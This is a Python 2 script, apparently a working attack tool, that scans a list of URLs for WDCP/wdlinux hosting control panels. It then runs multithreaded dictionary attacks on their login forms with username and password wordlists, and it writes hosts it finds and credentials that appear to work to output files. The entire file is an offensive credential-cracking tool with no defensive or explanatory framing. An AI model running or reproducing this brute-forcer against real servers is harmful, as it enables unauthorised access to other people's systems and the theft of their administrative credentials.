#coding=utf-8
import requests
import threading
import time
import os

def check(i,total):
	users = []
	with open("username.txt") as inFile:
		while True:
			user = inFile.readline().strip()
			if len(user) == 0: break
			users.append(user)

	passwords = []
	with open("password.txt") as inFile:
		while True:
			pwd = inFile.readline().strip()
			if len(pwd) == 0: break
			passwords.append(pwd)
	global eu
	#os.system("title Spider,Current threads: %d,URLs left: %d,URLs exists:%d" %(threading.active_count(),total,eu)) 
	try:
		#payload = {'username': 'admin', 'passwd': '123456'}
		r=requests.get(i+'/login',timeout=5)
		status=r.content.count('wdlinux')
	except:
		print i,'Timeout'
		status = 0
	if  status !=0:
		r = 0
		print i,'Exists!!!!!'
		eu+=1
		f = open("good.txt", 'a')
		f.write(i+'\n')
		f.close()
		for user in users:
			for pwd in passwords:
				pwd = pwd.replace('<user>', user)
				print 'testing', user, ' -- ', pwd
				payload={'username':user,'passwd':pwd}
				try:
					rr=requests.post(i+'/login',data=payload,timeout=10)
					if (rr.text.count('alert'))!=0:
						print 'error'
					else:
						f1=open('crack_wdcp.txt','a+')
						f1.write(i)
						f1.write('\n')
						f1.write(user+'---'+pwd)
						f1.write('\n')
						f1.close()
						time.sleep(3)
				except:
					print '!!!Error occured #2'
					
		
def main():
	global eu
	eu = 0
	total=len(open('8080.txt','rU').readlines())
	print 'Total URLs:%d' %total
	for i in open("8080.txt").readlines():
		i=i.strip('\n')
		t=threading.Thread(target=check, args=(i,total))
		t.setDaemon(True)
		total-=1
		while True:
			if(threading.active_count() == 1 and total == 0 ):
				print 'All Done at %s' %time.strftime("%Y-%m-%d[%H.%M.%S]")
				break
			elif (threading.active_count() < 200):
				if (total == 0):
					time.sleep(10)
				else:
					os.system("title Spider,Current threads: %d,URLs left: %d,URLs exists:%d" %(threading.active_count(),total,eu))
					t.start()
					break


if __name__ == '__main__':
	main()
